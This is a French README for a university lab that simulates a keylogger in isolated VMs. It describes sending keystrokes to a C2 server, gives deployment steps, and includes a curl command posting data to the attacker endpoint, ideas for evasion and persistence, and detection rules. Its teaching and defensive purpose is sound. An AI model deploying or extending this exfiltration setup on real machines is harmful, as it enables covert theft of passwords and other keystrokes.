# LAB 1 - Keylogger Extension Avancée

**⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT - VMs VirtualBox uniquement**

Simulation cybersécurité complète : machine victime → exfiltration → machine attaquante → contrôleur C2.

---

## Architecture

```
┌─────────────────┐         HTTP POST          ┌──────────────────┐
│   VM VICTIME    │    (192.168.1.25:5000)     │  VM ATTAQUANT    │
│                 │ ─────────────────────────> │                  │
│ keylogger.py    │   JSON: {victim_id,        │ attacker_server  │
│ - Capture clés  │         timestamp, data}   │ - Reçoit logs    │
│ - Encode JSON   │                            │ - Stocke/UUID    │
│ - Envoie /10s   │                            │                  │
│ - Buffer retry  │                            │ controller.py    │
│                 │                            │ - Liste victimes │
│                 │                            │ - Affiche logs   │
└─────────────────┘                            └──────────────────┘
```

---

## Installation & Configuration VirtualBox

### Prérequis
- **2 VMs minimum** : Kali/Debian (victime + attaquant)
- **Réseau** : Mode "Réseau Interne" dans VirtualBox
- **Pas d'accès Internet** pour le lab de sécurité

### Configuration réseau (Réseau Interne)

**VM Attaquant** (192.168.1.25) :
```bash
sudo ip addr add 192.168.1.25/24 dev eth0
sudo ip link set eth0 up
```

**VM Victime** (192.168.1.10) :
```bash
sudo ip addr add 192.168.1.10/24 dev eth0
sudo ip link set eth0 up
```

Test de connectivité :
```bash
# Depuis la victime
ping -c 3 192.168.1.25
```

---

## Déploiement

### Sur la VM Attaquant (192.168.1.25)

1. **Copier les fichiers** :
   ```bash
   # Via clé USB ou dossier partagé VirtualBox
   cd /opt
   sudo mkdir keylogger-lab
   sudo cp attacker_server.py controller.py /opt/keylogger-lab/
   cd /opt/keylogger-lab
   ```

2. **Lancer le serveur récepteur** :
   ```bash
   python3 attacker_server.py
   # Sortie : [AttackerServer] Listening on 0.0.0.0:5000, logs -> ./attacker_logs
   ```

3. **Lancer le contrôleur** (dans un autre terminal) :
   ```bash
   python3 controller.py
   # Menu interactif apparaît
   ```

### Sur la VM Victime (192.168.1.10)

**Option A : Installation système (recommandé pour la simulation)**
```bash
sudo apt update
sudo apt install python3-pynput
```

**Option B : Venv automatique (portable)**
```bash
# Le launcher gère tout automatiquement
./run_keylogger.sh
```

**Déploiement manuel** :
```bash
cd /tmp
cp keylogger.py run_keylogger.sh /tmp/
chmod +x run_keylogger.sh

# Lancer le keylogger
./run_keylogger.sh
# ou directement si pynput système installé :
python3 keylogger.py
```

---

## Utilisation

### Attaquant - Contrôleur CLI

```bash
python3 controller.py
```

Menu :
- **1. List victims** : Affiche tous les UUID avec dernière activité
- **2. View logs** : Affiche les dernières frappes d'une victime (tail)
- **3. Send command** : Placeholder (non implémenté dans version de base)
- **4. Exit**

### Format des logs

Fichiers stockés dans `attacker_logs/<victim_id>/<YYYY-MM-DD>.log` :
```json
{"timestamp": "2025-11-26T10:30:45", "data": "password123"}
{"timestamp": "2025-11-26T10:31:12", "data": "admin@example.com\n"}
```

### Mécanismes de Résilience

**Buffer local** : Si la victime perd la connexion réseau, les payloads sont stockés dans `pending.jsonl` et renvoyés lors du prochain cycle (flush automatique).

**Cycle d'exfiltration** : 10 secondes (configurable dans `keylogger.py` ligne `timer = threading.Timer(10, report)`)

---

## Détection & Défense (Point de vue CEH)

### Artefacts sur la Victime

1. **Processus** :
   ```bash
   ps aux | grep python
   # Rechercher keylogger.py ou processus suspect
   ```

2. **Connexions réseau** :
   ```bash
   netstat -tulpn | grep 192.168.1.25
   # Connexions HTTP sortantes répétées
   ```

3. **Fichiers suspects** :
   ```bash
   find /tmp /home -name "pending.jsonl" -o -name "log.txt"
   ls -la ~/.cache/.system_*
   ```

4. **Accès aux périphériques d'entrée** :
   ```bash
   lsof | grep /dev/input
   ```

### Signatures de Détection

**Snort/Suricata rule** (détection HTTP exfiltration) :
```
alert http any any -> 192.168.1.25 5000 (msg:"Keylogger exfiltration detected"; \
content:"victim_id"; http_client_body; sid:1000001;)
```

**Analyse réseau** :
```bash
sudo tcpdump -i eth0 -A 'tcp port 5000'
# Rechercher payloads JSON récurrents
```

---

## Améliorations Futures

### Prévues mais non implémentées

- **Commandes bidirectionnelles** : WebSocket ou polling pour `start_capture`, `stop_capture`, `switch_mode`
- **Chiffrement** : AES des payloads avant exfiltration
- **Mode TCP raw** : Alternative à HTTP pour éviter signatures
- **Analyse automatique** : Détection mots-clés (password, login, credit card)
- **Persistance** : systemd service ou crontab @reboot

---

## Sécurité & Éthique

🔴 **RAPPEL IMPORTANT** :
- Usage **exclusivement pédagogique** dans VMs isolées
- Interdit sur machines physiques ou réseaux de production
- Code développé pour comprendre les menaces et développer des défenses
- Respect des lois en vigueur (Code pénal art. 323-1 à 323-7)

---

## Troubleshooting

**Problème : `externally-managed-environment`**
```bash
# Solution 1 : Paquet système
sudo apt install python3-pynput

# Solution 2 : Forcer (déconseillé)
pip install pynput --break-system-packages

# Solution 3 : Utiliser run_keylogger.sh (auto-venv)
./run_keylogger.sh
```

**Problème : Pas de logs reçus**
```bash
# Vérifier serveur actif
curl http://192.168.1.25:5000/logs -X POST -d '{"victim_id":"test","timestamp":"now","data":"test"}'

# Vérifier réseau
ping 192.168.1.25

# Vérifier firewall
sudo iptables -L -n
```

**Problème : Keylogger ne capture rien**
```bash
# Vérifier permissions (nécessite accès /dev/input)
ls -l /dev/input/event*
# Ajouter utilisateur au groupe input si nécessaire
sudo usermod -a -G input $USER
```

---

## Fichiers du Projet

```
.
├── keylogger.py           # Client victime (capture + exfil)
├── run_keylogger.sh       # Launcher portable (gère venv)
├── attacker_server.py     # Serveur HTTP récepteur
├── controller.py          # Interface C2 contrôleur
├── AMELIORATIONS.md       # Analyse détaillée des améliorations
└── README.md              # Ce fichier
```

---

## Licence

Code éducatif développé dans le cadre du Master 2 Cybersécurité.  
Aucune garantie. Usage à vos risques et périls.
